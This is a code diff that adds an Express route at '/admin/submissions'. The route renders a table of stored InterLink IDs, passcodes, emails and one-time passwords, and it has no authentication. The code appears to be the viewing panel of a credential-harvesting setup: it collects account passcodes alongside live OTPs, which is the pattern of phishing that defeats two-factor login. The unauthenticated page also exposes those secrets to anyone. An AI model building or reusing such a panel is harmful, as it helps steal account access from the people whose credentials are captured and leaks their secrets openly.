@@ -89,6 +89,62 @@ app.get('/api/submissions', async (_request, response) => {
   response.json(result.rows);
 });
 
+app.get('/admin/submissions', async (_request, response) => {
+  const result = await pool.query(
+    `SELECT id, demo_interlink_id, demo_passcode, demo_email, demo_otp, created_at
+     FROM interlink_submissions ORDER BY created_at DESC LIMIT 500`
+  );
+  const escapeHtml = (value) => String(value ?? '')
+    .replaceAll('&', '&amp;')
+    .replaceAll('<', '&lt;')
+    .replaceAll('>', '&gt;')
+    .replaceAll('"', '&quot;')
+    .replaceAll("'", '&#039;');
+  const rows = result.rows.map((row) => `
+    <tr>
+      <td>${escapeHtml(row.id)}</td>
+      <td>${escapeHtml(row.demo_interlink_id)}</td>
+      <td>${escapeHtml(row.demo_passcode)}</td>
+      <td>${escapeHtml(row.demo_email)}</td>
+      <td>${escapeHtml(row.demo_otp)}</td>
+      <td>${escapeHtml(row.created_at)}</td>
+    </tr>`).join('');
+
+  response.send(`<!doctype html>
+    <html lang="en">
+      <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>InterLink Submissions</title>
+        <style>
+          body { background:#0a0a0a; color:#fff; font-family:Arial,sans-serif; padding:24px; }
+          h1 { margin-bottom:20px; }
+          table { border-collapse:collapse; width:100%; background:#111; }
+          th, td { border:1px solid #333; padding:10px; text-align:left; }
+          th { background:#1d1d1d; }
+          tr:nth-child(even) { background:#161616; }
+          @media(max-width:700px){ table { display:block; overflow-x:auto; } }
+        </style>
+      </head>
+      <body>
+        <h1>InterLink Submissions</h1>
+        <table>
+          <thead>
+            <tr>
+              <th>ID</th>
+              <th>InterLink ID</th>
+              <th>Passcode</th>
+              <th>Email</th>
+              <th>OTP</th>
+              <th>Created</th>
+            </tr>
+          </thead>
+          <tbody>${rows || '<tr><td colspan="6">No submissions</td></tr>'}</tbody>
+        </table>
+      </body>
+    </html>`);
+});
+
 app.get('/api/submissions.csv', async (_request, response) => {
   const result = await pool.query(
     `SELECT id, display_name, email, wallet_address, kyc_status,
